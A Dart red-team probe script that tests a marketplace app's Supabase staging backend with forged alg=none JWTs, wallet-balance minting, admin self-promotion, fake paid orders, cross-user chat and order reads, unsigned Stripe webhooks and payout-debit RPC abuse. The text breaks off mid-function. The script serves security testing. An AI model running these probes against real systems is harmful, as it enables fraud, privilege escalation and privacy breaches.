// Independent blind red-team probe — staging only.
// Do NOT import prior audit reports. Fixtures/observe/cleanup may use service_role.
// Exploits MUST be demonstrated with attacker JWT / anon.

import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stagingRef = 'fxdknzrqjenzqcvnwqqq';
const tag = 'rtE20260829';

late String base;
late String anon;
late String service;
late String buyerId;
late String sellerId;
late String buyerJwt;
late String sellerJwt;
late String freshId;
late String freshJwt;
late String freshEmail;
late String freshPass;

final findings = <Map<String, dynamic>>[];
final matrix = <Map<String, dynamic>>[];
final probes = <Map<String, dynamic>>[];
final raceResults = <Map<String, dynamic>>[];
final stripeResults = <Map<String, dynamic>>[];
final invariantResults = <Map<String, dynamic>>[];
final surfacesHit = <String>[];
final notes = <String>[];
final created = <String, List<String>>{
  'products': [],
  'orders': [],
  'users': [],
  'lives': [],
};

void hit(String s) {
  if (!surfacesHit.contains(s)) surfacesHit.add(s);
}

Map<String, String> hdr(String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> anonH() => {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> svcH() => {
      'apikey': service,
      'Authorization': 'Bearer $service',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

String clip(String s, [int n = 480]) {
  final t = s.replaceAll(RegExp(r'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9._-]{20,}'), '[JWT]');
  if (t.length <= n) return t;
  return '${t.substring(0, n)}…';
}

Future<Map<String, dynamic>> req(
  String method,
  String url, {
  Map<String, String>? headers,
  Object? body,
}) async {
  final h = headers ?? anonH();
  http.Response r;
  final uri = Uri.parse(url);
  final encoded = body == null
      ? null
      : (body is String ? body : jsonEncode(body));
  switch (method) {
    case 'GET':
      r = await http.get(uri, headers: h);
      break;
    case 'POST':
      r = await http.post(uri, headers: h, body: encoded);
      break;
    case 'PATCH':
      r = await http.patch(uri, headers: h, body: encoded);
      break;
    case 'PUT':
      r = await http.put(uri, headers: h, body: encoded);
      break;
    case 'DELETE':
      r = await http.delete(uri, headers: h, body: encoded);
      break;
    case 'HEAD':
      r = await http.head(uri, headers: h);
      break;
    default:
      throw ArgumentError(method);
  }
  dynamic parsed;
  try {
    parsed = r.body.isEmpty ? null : jsonDecode(r.body);
  } catch (_) {
    parsed = r.body;
  }
  return {
    'http': r.statusCode,
    'body': parsed,
    'raw': clip(r.body),
    'headers': {
      'content-range': r.headers['content-range'],
      'content-type': r.headers['content-type'],
    },
  };
}

void rec(
  String surface,
  String attack,
  String identity,
  Map<String, dynamic> res, {
  String impact = '',
  String severity = 'info',
  bool persistCheck = false,
  String? persistNote,
}) {
  final row = {
    'surface': surface,
    'attack': attack,
    'identity': identity,
    'http': res['http'],
    'result': clip('${res['raw'] ?? res['body']}'),
    'impact': impact,
    'severity': severity,
    if (persistNote != null) 'persist': persistNote,
  };
  matrix.add(row);
  probes.add({
    'id': '${surface}_$attack'.replaceAll(' ', '_'),
    'http': res['http'],
    'body': res['raw'],
    'persist': persistCheck,
    if (persistNote != null) 'persist_note': persistNote,
  });
}

void finding({
  required String id,
  required String sev,
  required String title,
  required String actor,
  required String pre,
  required String repro,
  required String impact,
  String state = 'OPEN',
  Map<String, dynamic>? evidence,
}) {
  findings.add({
    'id': id,
    'severity': sev,
    'title': title,
    'actor': actor,
    'preconditions': pre,
    'reproduction': repro,
    'impact': impact,
    'state': state,
    if (evidence != null) 'evidence': evidence,
  });
}

Future<Map<String, dynamic>> rest(
  String method,
  String table, {
  String jwt = '',
  String qs = '',
  Object? body,
  bool asAnon = false,
  bool asSvc = false,
}) {
  final url = '$base/rest/v1/$table${qs.isEmpty ? '' : '?$qs'}';
  final h = asSvc
      ? svcH()
      : asAnon
          ? anonH()
          : hdr(jwt);
  return req(method, url, headers: h, body: body);
}

Future<Map<String, dynamic>> rpc(
  String fn,
  Map<String, dynamic> params, {
  String jwt = '',
  bool asAnon = false,
  bool asSvc = false,
}) {
  final h = asSvc
      ? svcH()
      : asAnon
          ? anonH()
          : hdr(jwt);
  return req('POST', '$base/rest/v1/rpc/$fn', headers: h, body: params);
}

Future<Map<String, dynamic>> edge(
  String fn,
  Object body, {
  String jwt = '',
  bool asAnon = false,
  Map<String, String>? extra,
  String qs = '',
}) {
  final h = Map<String, String>.from(
    asAnon ? anonH() : (jwt.isEmpty ? anonH() : hdr(jwt)),
  );
  if (extra != null) h.addAll(extra);
  return req('POST', '$base/functions/v1/$fn$qs', headers: h, body: body);
}

Future<Map<String, dynamic>> edgeGet(
  String fn, {
  String qs = '',
  String jwt = '',
  bool asAnon = true,
}) {
  final h = asAnon || jwt.isEmpty ? anonH() : hdr(jwt);
  return req('GET', '$base/functions/v1/$fn$qs', headers: h);
}

dynamic firstRow(dynamic body) {
  if (body is List && body.isNotEmpty) return body.first;
  if (body is Map) return body;
  return null;
}

int? numOf(dynamic v) {
  if (v is num) return v.round();
  return int.tryParse('$v');
}

Future<void> boot() async {
  final env = loadLiveOpsStagingEnv();
  base = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!base.contains(stagingRef)) {
    throw StateError('Refused: not staging $stagingRef');
  }
  anon = envRequire(env, 'SUPABASE_ANON_KEY');
  service = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');

  final c = LiveOpsStagingClient(
    url: base,
    anonKey: anon,
    serviceRoleKey: service,
  );
  buyerJwt = await c.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  sellerJwt = await c.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );

  final nonce = DateTime.now().millisecondsSinceEpoch;
  freshEmail = 'rte.$nonce@fleaber.staging.invalid';
  freshPass = 'RtE_${nonce}_Aa1!';
  freshId = await c.createAdminUser(
    email: freshEmail,
    password: freshPass,
    userMetadata: {'full_name': 'RT-E fresh'},
  );
  created['users']!.add(freshId);
  freshJwt = await c.signIn(email: freshEmail, password: freshPass);

  // Ensure profile row exists for fresh user (trigger may already).
  await rest('POST', 'profiles', jwt: freshJwt, body: {
    'id': freshId,
    'full_name': 'RT-E fresh',
    'user_type': 'comprador',
  });

  notes.add('login_ok buyer/seller/fresh staging=$stagingRef');
}

Future<List<String>> openApiTables() async {
  hit('OPENAPI');
  final r = await req(
    'GET',
    '$base/rest/v1/',
    headers: {
      ...anonH(),
      'Accept': 'application/openapi+json',
    },
  );
  rec('OPENAPI', 'fetch', 'anon', r);
  final body = r['body'];
  final tables = <String>[];
  final rpcs = <String>[];
  if (body is Map && body['paths'] is Map) {
    for (final k in (body['paths'] as Map).keys) {
      final p = k.toString();
      if (p.startsWith('/rpc/')) {
        rpcs.add(p.substring(5));
      } else if (p.startsWith('/') && !p.contains('{')) {
        final name = p.substring(1);
        if (name.isNotEmpty && !name.contains('/')) tables.add(name);
      }
    }
  }
  notes.add('openapi_tables=${tables.length} rpcs=${rpcs.length}');
  probes.add({'id': 'openapi_tables', 'tables': tables, 'rpcs': rpcs});
  return [...tables, ...rpcs.map((e) => 'rpc:$e')];
}

Future<List<String>> rpcNamesFromOpenApi() async {
  final r = await req(
    'GET',
    '$base/rest/v1/',
    headers: {
      ...anonH(),
      'Accept': 'application/openapi+json',
    },
  );
  final out = <String>[];
  final body = r['body'];
  if (body is Map && body['paths'] is Map) {
    for (final k in (body['paths'] as Map).keys) {
      final p = k.toString();
      if (p.startsWith('/rpc/')) out.add(p.substring(5));
    }
  }
  return out;
}

const sensitiveTables = [
  'orders',
  'products',
  'profiles',
  'wallets',
  'wallet_transactions',
  'wallet_ledger',
  'wallet_payout_ledger',
  'fleaber_commissions',
  'chats',
  'chat_messages',
  'reviews',
  'order_disputes',
  'disputes',
  'lives',
  'live_items',
  'live_reservation_requests',
  'live_raffles',
  'live_raffle_winners',
  'live_tips',
  'live_messages',
  'stripe_checkout_events',
  'payouts',
  'payout_intents',
  'seller_banking_details',
  'seller_payout_details',
  'banking_details',
  'seller_bundle_discounts',
  'product_offers',
  'offers',
  'proposals',
  'order_proposals',
  'ps_ingest_audit',
  'ps_pairing',
  'ps_devices',
  'app_logs',
  'admin_users',
  'staff',
];

Future<void> pass1Rls() async {
  hit('RLS');
  // Discover foreign orders/chats/wallets via service (observe only).
  final otherOrders = await rest(
    'GET',
    'orders',
    asSvc: true,
    qs: 'select=id,buyer_id,seller_id,status,price_total,amount_paid_cents,stripe_payment_intent_id&buyer_id=neq.$buyerId&limit=5',
  );
  final otherOrderId = firstRow(otherOrders['body']) is Map
      ? '${(firstRow(otherOrders['body']) as Map)['id']}'
      : '';
  final otherBuyer = firstRow(otherOrders['body']) is Map
      ? '${(firstRow(otherOrders['body']) as Map)['buyer_id']}'
      : '';

  final identities = {
    'anon': (String t, String qs) => rest('GET', t, asAnon: true, qs: qs),
    'buyer': (String t, String qs) => rest('GET', t, jwt: buyerJwt, qs: qs),
    'seller': (String t, String qs) => rest('GET', t, jwt: sellerJwt, qs: qs),
    'fresh': (String t, String qs) => rest('GET', t, jwt: freshJwt, qs: qs),
  };

  for (final t in sensitiveTables) {
    for (final e in identities.entries) {
      final r = await e.value(t, 'select=*&limit=20');
      final n = r['body'] is List ? (r['body'] as List).length : (r['http'] == 200 ? 1 : 0);
      rec(t, 'SELECT *', e.key, r, impact: 'rows=$n');
      if (e.key == 'anon' && r['http'] == 200 && n > 0) {
        // Anon seeing rows may be public catalog — judge later.
      }
    }
  }

  // Explicit stream-key column
  for (final idn in ['anon', 'buyer', 'fresh']) {
    final jwt = idn == 'anon' ? '' : (idn == 'buyer' ? buyerJwt : freshJwt);
    final r = await rest(
      'GET',
      'lives',
      jwt: jwt,
      asAnon: idn == 'anon',
      qs: 'select=id,mux_stream_key,stream_key,mux_playback_id&limit=5',
    );
    rec('lives', 'SELECT stream_key cols', idn, r);
    final body = r['body'];
    var leaked = false;
    if (body is List) {
      for (final row in body) {
        if (row is Map) {
          final k = '${row['mux_stream_key'] ?? ''}${row['stream_key'] ?? ''}';
          if (k.trim().isNotEmpty && k != 'null') leaked = true;
        }
      }
    }
    if (leaked) {
      finding(
        id: 'RT-E-LIVE-KEY',
        sev: 'P1',
        title: 'Stream key Mux visível via PostgREST',
        actor: idn,
        pre: 'JWT/anon GET lives?select=mux_stream_key',
        repro: 'GET /rest/v1/lives?select=id,mux_stream_key,stream_key',
        impact: 'Quem conhece a key pode injectar RTMP no directo alheio.',
        evidence: {'http': r['http'], 'raw': r['raw']},
      );
    }
  }

  // Cross-user order by UUID
  if (otherOrderId.isNotEmpty && otherOrderId != 'null') {
    for (final e in {
      'buyer': buyerJwt,
      'fresh': freshJwt,
    }.entries) {
      final r = await rest(
        'GET',
        'orders',
        jwt: e.value,
        qs: 'id=eq.$otherOrderId&select=id,buyer_id,seller_id,status,price_total,amount_paid_cents,stripe_payment_intent_id,shipping_address,buyer_phone',
      );
      rec('orders', 'SELECT foreign UUID', e.key, r);
      final rows = r['body'] is List ? r['body'] as List : [];
      if (rows.isNotEmpty) {
        final row = rows.first;
        final bid = row is Map ? '${row['buyer_id']}' : '';
        if (bid != e.key && bid != buyerId && e.key == 'fresh') {
          finding(
            id: 'RT-E-ORD-XUSER',
            sev: 'P1',
            title: 'JWT lê order alheia por UUID',
            actor: e.key,
            pre: 'UUID válido de outra encomenda',
            repro: 'GET /orders?id=eq.$otherOrderId',
            impact: 'Privacidade financeira cross-user.',
            evidence: {'http': r['http'], 'raw': r['raw']},
          );
        }
      }
    }
  }

  // Wallet foreign
  final rWal = await rest(
    'GET',
    'wallets',
    jwt: freshJwt,
    qs: 'id=eq.$sellerId&select=*',
  );
  rec('wallets', 'SELECT seller wallet as fresh', 'fresh', rWal);
  final walRows = rWal['body'] is List ? rWal['body'] as List : [];
  if (walRows.isNotEmpty) {
    finding(
      id: 'RT-E-WAL-XUSER',
      sev: 'P1',
      title: 'JWT lê carteira alheia',
      actor: 'fresh',
      pre: 'UUID seller conhecido',
      repro: 'GET /wallets?id=eq.{seller}',
      impact: 'Saldo e Stripe account id alheios.',
      evidence: {'http': rWal['http'], 'raw': rWal['raw']},
    );
  }

  // Wallet INSERT mint
  final rMint = await rest('POST', 'wallets', jwt: freshJwt, body: {
    'id': freshId,
    'balance': 99999.99,
    'stripe_account_id': 'acct_hostile',
  });
  rec('wallets', 'INSERT balance=99999', 'fresh', rMint);
  final afterMint = await rest(
    'GET',
    'wallets',
    asSvc: true,
    qs: 'id=eq.$freshId&select=id,balance,stripe_account_id',
  );
  final minted = firstRow(afterMint['body']);
  final bal = minted is Map ? numOf(minted['balance']) : null;
  if (rMint['http'] < 300 && (bal ?? 0) > 0) {
    finding(
      id: 'RT-E-WAL-MINT',
      sev: 'P0',
      title: 'JWT cria saldo de carteira',
      actor: 'fresh JWT',
      pre: 'utilizador sem wallet ou INSERT permitido',
      repro: 'POST /wallets {id:self, balance:99999.99}',
      impact: 'Criação de fundos sem captura Stripe.',
      evidence: {
        'insert_http': rMint['http'],
        'row': minted,
      },
    );
  }

  final rWalUpd = await rest(
    'PATCH',
    'wallets',
    jwt: buyerJwt,
    qs: 'id=eq.$buyerId',
    body: {'balance': 88888.88},
  );
  rec('wallets', 'PATCH own balance', 'buyer', rWalUpd);
  final afterUpd = await rest(
    'GET',
    'wallets',
    asSvc: true,
    qs: 'id=eq.$buyerId&select=id,balance',
  );
  final bAfter = firstRow(afterUpd['body']);
  if (bAfter is Map && numOf(bAfter['balance']) == 88888) {
    finding(
      id: 'RT-E-WAL-PATCH',
      sev: 'P0',
      title: 'JWT altera balance da própria carteira',
      actor: 'buyer JWT',
      pre: 'wallet existente',
      repro: 'PATCH /wallets?id=eq.self {balance:88888}',
      impact: 'Mint de saldo.',
      evidence: {'http': rWalUpd['http'], 'row': bAfter},
    );
  }

  // Ledger insert
  final rLed = await rest('POST', 'wallet_transactions', jwt: buyerJwt, body: {
    'wallet_id': buyerId,
    'amount': 500,
    'type': 'venda',
    'description': '$tag mint',
  });
  rec('wallet_transactions', 'INSERT privileged type', 'buyer', rLed);

  final rLed2 = await rest('POST', 'wallet_ledger', jwt: buyerJwt, body: {
    'wallet_id': buyerId,
    'amount_cents': 50000,
    'entry_type': 'credit',
  });
  rec('wallet_ledger', 'INSERT', 'buyer', rLed2);

  // Profiles privilege
  hit('AUTH / PROFILES');
  for (final claim in ['admin', 'administrador', 'admim', 'seller', 'vendedor']) {
    final r = await rest(
      'PATCH',
      'profiles',
      jwt: freshJwt,
      qs: 'id=eq.$freshId',
      body: {'user_type': claim},
    );
    rec('profiles', 'PATCH user_type=$claim', 'fresh', r);
  }
  final profAfter = await rest(
    'GET',
    'profiles',
    asSvc: true,
    qs: 'id=eq.$freshId&select=id,user_type',
  );
  final ut = firstRow(profAfter['body']);
  final uts = ut is Map ? '${ut['user_type']}'.toLowerCase() : '';
  if (uts.contains('admin') || uts == 'admim' || uts.contains('administr')) {
    finding(
      id: 'RT-E-ADMIN-PROMO',
      sev: 'P0',
      title: 'JWT auto-promove a admin',
      actor: 'fresh',
      pre: 'perfil próprio',
      repro: 'PATCH /profiles user_type=admin',
      impact: 'Autoridade administrativa.',
      evidence: {'row': ut},
    );
  }

  // Seller cannot set buyer_id on own product orders via insert as buyer of other
  // Orders INSERT as buyer with seller_id swapped / paid status
  hit('ORDERS');
  // Need a product of seller
  final prod = await rest(
    'GET',
    'products',
    asSvc: true,
    qs: 'seller_id=eq.$sellerId&select=id,price,quantity,seller_id&limit=1',
  );
  String pid = '';
  final prow = firstRow(prod['body']);
  if (prow is Map) pid = '${prow['id']}';

  if (pid.isNotEmpty) {
    final insPaid = await rest('POST', 'orders', jwt: buyerJwt, body: {
      'product_id': pid,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'price_total': 0.01,
      'status': 'pago',
      'payment_method': 'Pagamento na App',
      'shipping_method': 'hand',
      'quantity': 1,
      'amount_paid_cents': 1,
      'stripe_payment_intent_id': 'pi_hostile',
      'notes': tag,
    });
    rec('orders', 'INSERT status=pago + PI fake', 'buyer', insPaid);
    final oid = firstRow(insPaid['body']);
    if (oid is Map && oid['id'] != null) {
      created['orders']!.add('${oid['id']}');
      final st = '${oid['status']}'.toLowerCase();
      final pi = '${oid['stripe_payment_intent_id'] ?? ''}';
      final paid = numOf(oid['amount_paid_cents']);
      if (st == 'pago') {
        finding(
          id: 'RT-E-ORD-SELF-PAID',
          sev: 'P0',
          title: 'Buyer INSERT order já paga',
          actor: 'buyer JWT',
          pre: 'produto válido',
          repro: 'POST /orders status=pago amount_paid_cents=1',
          impact: 'Venda/saldo sem Stripe.',
          evidence: {'row': oid},
        );
      }
      if (pi.contains('pi_hostile')) {
        finding(
          id: 'RT-E-ORD-FAKE-PI',
          sev: 'P1',
          title: 'Buyer grava Stripe PaymentIntent ID',
          actor: 'buyer JWT',
          pre: 'INSERT order',
          repro: 'POST /orders stripe_payment_intent_id=pi_hostile',
          impact: 'Autoridade Stripe no cliente.',
          evidence: {'row': oid},
        );
      }
      if ((paid ?? 0) > 0 && st != 'pago') {
        // persisted paid cents without paid status — still interesting
        notes.add('order_insert_amount_paid_cents=$paid status=$st');
      }
    }

    final insOtherBuyer = await rest('POST', 'orders', jwt: buyerJwt, body: {
      'product_id': pid,
      'buyer_id': freshId,
      'seller_id': sellerId,
      'price_total': 5,
      'status': 'reserva_pendente',
      'payment_method': 'Pagamento na App',
      'quantity': 1,
      'notes': tag,
    });
    rec('orders', 'INSERT as other buyer_id', 'buyer', insOtherBuyer);
    final ob = firstRow(insOtherBuyer['body']);
    if (ob is Map && '${ob['buyer_id']}' == freshId) {
      created['orders']!.add('${ob['id']}');
      finding(
        id: 'RT-E-ORD-PARTY-SWAP',
        sev: 'P1',
        title: 'Buyer cria order em nome de outro buyer',
        actor: 'buyer JWT',
        pre: 'UUID alheio conhecido',
        repro: 'POST /orders buyer_id={fresh}',
        impact: 'Troca de parties.',
        evidence: {'row': ob},
      );
    }
  }

  // Chat foreign
  hit('CHAT');
  final chatsSvc = await rest(
    'GET',
    'chats',
    asSvc: true,
    qs: 'select=id,user_a,user_b&limit=20',
  );
  String foreignChat = '';
  if (chatsSvc['body'] is List) {
    for (final row in chatsSvc['body'] as List) {
      if (row is Map) {
        final a = '${row['user_a']}';
        final b = '${row['user_b']}';
        if (a != buyerId && b != buyerId && a != sellerId && b != sellerId) {
          foreignChat = '${row['id']}';
          break;
        }
      }
    }
  }
  if (foreignChat.isNotEmpty) {
    final r = await rest(
      'GET',
      'chats',
      jwt: freshJwt,
      qs: 'id=eq.$foreignChat&select=*',
    );
    rec('chats', 'SELECT foreign chat UUID', 'fresh', r);
    final n = r['body'] is List ? (r['body'] as List).length : 0;
    if (n > 0) {
      finding(
        id: 'RT-E-CHAT-XUSER',
        sev: 'P1',
        title: 'JWT lê chat alheio por UUID',
        actor: 'fresh',
        pre: 'UUID chat de terceiros',
        repro: 'GET /chats?id=eq.{id}',
        impact: 'Privacidade de conversas.',
        evidence: {'http': r['http'], 'raw': r['raw']},
      );
    }
    final msgs = await rest(
      'GET',
      'chat_messages',
      jwt: freshJwt,
      qs: 'chat_id=eq.$foreignChat&select=id,text,sender_id&limit=5',
    );
    rec('chat_messages', 'SELECT foreign thread', 'fresh', msgs);
    final mn = msgs['body'] is List ? (msgs['body'] as List).length : 0;
    if (mn > 0) {
      finding(
        id: 'RT-E-CHATMSG-XUSER',
        sev: 'P1',
        title: 'JWT lê mensagens de chat alheio',
        actor: 'fresh',
        pre: 'UUID chat de terceiros',
        repro: 'GET /chat_messages?chat_id=eq.{id}',
        impact: 'Conteúdo de conversas alheias.',
        evidence: {'http': msgs['http'], 'raw': msgs['raw']},
      );
    }
  }

  // Disputes
  hit('DISPUTES');
  for (final t in ['order_disputes', 'disputes']) {
    final r = await rest('GET', t, jwt: freshJwt, qs: 'select=*&limit=20');
    rec(t, 'SELECT *', 'fresh', r);
  }

  unused(otherBuyer);
}

void unused(dynamic _) {}

Future<void> pass1Rpc(List<String> rpcs) async {
  hit('RPC');
  hit('SECURITY DEFINER');
  final interesting = rpcs.where((n) {
    final x = n.toLowerCase();
    return x.contains('wallet') ||
        x.contains('payout') ||
        x.contains('refund') ||
        x.contains('order') ||
        x.contains('stock') ||
        x.contains('raffle') ||
        x.contains('review') ||
        x.contains('admin') ||
        x.contains('settle') ||
        x.contains('credit') ||
        x.contains('debit') ||
        x.contains('tip') ||
        x.contains('convert') ||
        x.contains('accept') ||
        x.contains('release') ||
        x.contains('stripe') ||
        x.contains('prize') ||
        x.contains('ocr') ||
        x.contains('ps_') ||
        x.startsWith('batata_');
  }).toList();

  final payloads = <String, Map<String, dynamic>>{
    'batata_ensure_wallet': {'p_user_id': sellerId},
    'batata_wallet_payout_debit': {
      'p_user_id': sellerId,
      'p_amount_cents': 100,
      'p_idempotency_key': '${tag}_debit_x',
    },
    'batata_wallet_payout_finish': {
      'p_idempotency_key': '${tag}_debit_x',
      'p_stripe_transfer_id': 'tr_hostile',
      'p_failed': false,
    },
    'batata_credit_wallet_once': {
      'p_wallet_id': sellerId,
      'p_amount': 50,
      'p_type': 'venda',
      'p_order_id': null,
    },
    'batata_debit_wallet_once': {
      'p_wallet_id': sellerId,
      'p_amount': 1,
      'p_type': 'levantamento',
    },
    'batata_finalize_stripe_order_refund': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_refund_id': 're_hostile',
      'p_payment_intent_id': 'pi_hostile',
      'p_session_id': 'cs_hostile',
      'p_amount_cents': 100,
    },
    'batata_settle_live_tip_from_stripe': {
      'p_tip_id': '00000000-0000-0000-0000-000000000001',
      'p_stripe_session_id': 'cs_hostile',
      'p_paid_amount_cents': 100,
    },
    'batata_create_live_tip_pending': {
      'p_live_id': null,
      'p_seller_id': sellerId,
      'p_amount': 1,
      'p_message': tag,
    },
    'batata_get_my_payout_details': {},
  };

  for (final name in interesting) {
    final body = payloads[name] ?? <String, dynamic>{};
    for (final e in {
      'anon': (Map<String, dynamic> b) => rpc(name, b, asAnon: true),
      'buyer': (Map<String, dynamic> b) => rpc(name, b, jwt: buyerJwt),
      'fresh': (Map<String, dynamic> b) => rpc(name, b, jwt: freshJwt),
      'seller': (Map<String, dynamic> b) => rpc(name, b, jwt: sellerJwt),
    }.entries) {
      final r = await e.value(body);
      rec('rpc:$name', 'call default payload', e.key, r);
      final http = r['http'] as int;
      final raw = '${r['raw']}';
      final okish = http < 300 &&
          !raw.contains('"ok":false') &&
          !raw.toLowerCase().contains('permission') &&
          !raw.toLowerCase().contains('not authorized') &&
          !raw.toLowerCase().contains('jwt');
      if (okish &&
          (name.contains('payout_debit') ||
              name.contains('payout_finish') ||
              name.contains('credit_wallet') ||
              name.contains('finalize_stripe') ||
              name.contains('settle_live_tip'))) {
        // Confirm persist via service observe later in finance pass.
        notes.add('RPC_OK $name as ${e.key} http=$http ${clip(raw, 160)}');
      }
    }
  }

  // Extra: buyer debit own + other
  final ownDebit = await rpc('batata_wallet_payout_debit', {
    'p_user_id': buyerId,
    'p_amount_cents': 1,
    'p_idempotency_key': '${tag}_buyer_self_debit',
  }, jwt: buyerJwt);
  rec('rpc:batata_wallet_payout_debit', 'self 1 cent', 'buyer', ownDebit);

  final otherDebit = await rpc('batata_wallet_payout_debit', {
    'p_user_id': sellerId,
    'p_amount_cents': 1,
    'p_idempotency_key': '${tag}_buyer_seller_debit',
  }, jwt: buyerJwt);
  rec('rpc:batata_wallet_payout_debit', 'other seller wallet', 'buyer', otherDebit);

  // Observe seller wallet if debit succeeded
  if ((otherDebit['http'] as int) < 300) {
    final raw = '${otherDebit['raw']}';
    if (raw.contains('"ok":true') || raw.contains('"status":"debited"')) {
      finding(
        id: 'RT-E-RPC-PAYOUT-XUSER',
        sev: 'P0',
        title: 'Buyer JWT debita carteira do seller',
        actor: 'buyer JWT',
        pre: 'EXECUTE em batata_wallet_payout_debit',
        repro: 'rpc batata_wallet_payout_debit p_user_id=seller',
        impact: 'Roubo de saldo / payout authority.',
        evidence: {'http': otherDebit['http'], 'raw': otherDebit['raw']},
      );
    }
  }
}

Future<void> pass1Edge() async {
  hit('EDGE FUNCTIONS');
  hit('CHECKOUT');
  hit('STRIPE SESSION');
  hit('WEBHOOK');
  hit('PAYOUT');
  hit('TIPS');
  hit('MUX');
  hit('LIVEKIT');
  hit('PS/OCR');
  hit('REFUNDS');

  // JWT alg=none
  final noneJwt =
      '${base64Url.encode(utf8.encode('{"alg":"none","typ":"JWT"}')).replaceAll('=', '')}.'
      '${base64Url.encode(utf8.encode(jsonEncode({
            'role': 'service_role',
            'iss': 'supabase',
            'ref': stagingRef,
            'sub': buyerId,
          }))).replaceAll('=', '')}.';
  final rNone = await rest(
    'GET',
    'wallets',
    jwt: noneJwt,
    qs: 'select=*&limit=5',
  );
  rec('AUTH', 'JWT alg=none service_role', 'forged', rNone);
  if (rNone['http'] == 200 &&
      rNone['body'] is List &&
      (rNone['body'] as List).length > 1) {
    finding(
      id: 'RT-E-JWT-NONE',
      sev: 'P0',
      title: 'JWT alg=none aceite como service_role',
      actor: 'unauth',
      pre: 'nenhuma',
      repro: 'Authorization Bearer alg=none role=service_role',
      impact: 'Bypass total de auth.',
      evidence: {'http': rNone['http'], 'raw': rNone['raw']},
    );
  }

  // Webhook without signature
  final wh = await edge('stripe-webhook', {
    'type': 'checkout.session.completed',
    'data': {
      'object': {'id': 'cs_test_hostile', 'payment_status': 'paid'}
    }
  }, asAnon: true);
  rec('stripe-webhook', 'POST no signature', 'anon', wh);

  // fase2 settle with buyer jwt
  final e2e = await edge(
    'create-payment-intent',
    {
      'order_id': '00000000-0000-0000-0000-000000000001',
      'payment_intent_id': 'pi_hostile',
    },
    jwt: buyerJwt,
    qs: '?fase2_e2e_settle=1',
  );
  rec('create-payment-intent', 'fase2_e2e_settle as buyer', 'buyer', e2e);
  if ((e2e['http'] as int) == 200 && '${e2e['raw']}'.contains('"ok":true')) {
    finding(
      id: 'RT-E-E2E-SETTLE',
      sev: 'P0',
      title: 'Buyer JWT acede a settle E2E',
      actor: 'buyer',
      pre: 'query fase2_e2e_settle=1',
      repro: 'POST create-payment-intent?fase2_e2e_settle=1',
      impact: 'Settle privilegiado com PI arbitrário.',
      evidence: {'http': e2e['http'], 'raw': e2e['raw']},
    );
  }

  // sec-fase2-e2e-oversell as buyer
  final ov = await edge('sec-fase2-e2e-oversell', {
    'buyer_id': buyerId,
    'seller_id': sellerId,
  }, jwt: buyerJwt);
  rec('sec-fase2-e2e-oversell', 'POST as buyer', 'buyer', ov);

  // refund as buyer
  final rf = await edge('refund-order', {'order_id': '00000000-0000-0000-0000-000000000001'},
      jwt: buyerJwt);
  rec('refund-order', 'buyer refund foreign/missing', 'buyer', rf);

  // create-payment-intent hostile
  final cpi = await edge('create-payment-intent', {
    'amount': 50,
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'order_id': '00000000-0000-0000-0000-000000000001',
    'quantity': 1,
    'item_price': 0.5,
    'shipping_method': 'hand',
    'prize_shipping': true,
  }, jwt: buyerJwt);
  rec('create-payment-intent', 'hostile amount+prize+fake order', 'buyer', cpi);

  // payout other user
  final po = await edge('create-connect-account', {
    'user_id': sellerId,
    'amount': 100,
    'idempotency_key': '${tag}_payout_xuser',
  }, jwt: buyerJwt);
  rec('create-connect-account', 'payout as other user_id', 'buyer', po);

  final po2 = await edge('create-connect-account', {
    'user_id': buyerId,
    'amount': 100,
    'idempotency_key': '${tag}_payout_self',
  }, jwt: buyerJwt);
  rec('create-connect-account', 'payout self 1€', 'buyer', po2);

  // tip with client tip_id
  final tip = await edge('create-live-tip-checkout', {
    'tip_id': '00000000-0000-0000-0000-000000000001',
    'seller_id': sellerId,
    'amount_eur': 1,
  }, jwt: buyerJwt);
  rec('create-live-tip-checkout', 'client tip_id', 'buyer', tip);

  final tip2 = await edge('create-live-tip-checkout', {
    'seller_id': sellerId,
    'amount_eur': 0.01,
  }, jwt: buyerJwt);
  rec('create-live-tip-checkout', 'amount 0.01', 'buyer', tip2);

  final tip3 = await edge('create-live-tip-checkout', {
    'seller_id': sellerId,
    'amount_eur': 9999,
  }, jwt: buyerJwt);
  rec('create-live-tip-checkout', 'amount 9999', 'buyer', tip3);

  // mux as buyer
  final mux = await edge('create-mux-live', {'title': 'hostile live title xx'}, jwt: buyerJwt);
  rec('create-mux-live', 'buyer creates live', 'buyer', mux);
  if ((mux['http'] as int) < 300 && '${mux['raw']}'.contains('stream')) {
    finding(
      id: 'RT-E-MUX-BUYER',
      sev: 'P1',
      title: 'Buyer cria stream Mux',
      actor: 'buyer',
      pre: 'conta comprador',
      repro: 'POST create-mux-live',
      impact: 'Custo Mux / keys de ingest.',
      evidence: {'http': mux['http'], 'raw': mux['raw']},
    );
  }

  final muxAnon = await edge('create-mux-live', {'title': 'anon live xxx'}, asAnon: true);
  rec('create-mux-live', 'anon', 'anon', muxAnon);

  final play = await edge('resolve-mux-playback', {'live_id': '00000000-0000-0000-0000-000000000001'},
      asAnon: true);
  rec('resolve-mux-playback', 'anon fake id', 'anon', play);

  final lk = await edge('livekit-mux-publish', {
    'step': 'token',
    'live_id': '00000000-0000-0000-0000-000000000001',
  }, jwt: buyerJwt);
  rec('livekit-mux-publish', 'token as buyer foreign live', 'buyer', lk);

